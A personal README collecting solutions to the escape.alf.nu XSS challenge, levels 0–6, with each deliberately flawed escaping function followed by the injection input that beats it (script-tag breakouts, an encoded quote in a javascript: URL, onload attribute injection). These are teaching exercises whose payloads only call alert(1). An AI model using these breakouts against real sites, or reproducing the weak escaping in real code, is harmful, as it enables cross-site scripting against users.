# JavaScript Injection Challenges Solutions

Just a repository to keep my solutions so that I can remember them over time...



## ESCAPE.ALF.NU
http://escape.alf.nu



### LEVEL 0

CODE: 

```javascript
function escape(s) {
  // Warmup.

  return '<script>console.log("'+s+'");</script>';
}
```

INPUT:

`"+alert(1)+"`, `");alert(1)//`



### LEVEL 1

CODE: 

```javascript
function escape(s) {
  // Escaping scheme courtesy of Adobe Systems, Inc.
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

INPUT:

`\");alert(1)//`



### LEVEL 2

CODE: 

```javascript
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

INPUT:

`</script><script>alert(1)//`



### LEVEL 3

CODE: 

```javascript
function escape(s) {
  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
  console.log(url);

  var a = document.createElement('a');
  a.href = url;
  document.body.appendChild(a);
  a.click();
}
```

INPUT:

`%22);alert(1)//`



### LEVEL 4

CODE: 

```javascript
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace('"', '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

INPUT:

`[[a|""onload="alert(1)"]]`



### LEVEL 5

CODE: 

```javascript
function escape(s) {
  // Level 4 had a typo, thanks Alok.
  // If your solution for 4 still works here, you can go back and get more points on level 4 now.

  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

INPUT:

`[[a|http://onload='alert(1)']]`



### LEVEL 6

CODE: 

```javascript
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```

INPUT:

`Comment#--><script>alert(1)</script>`
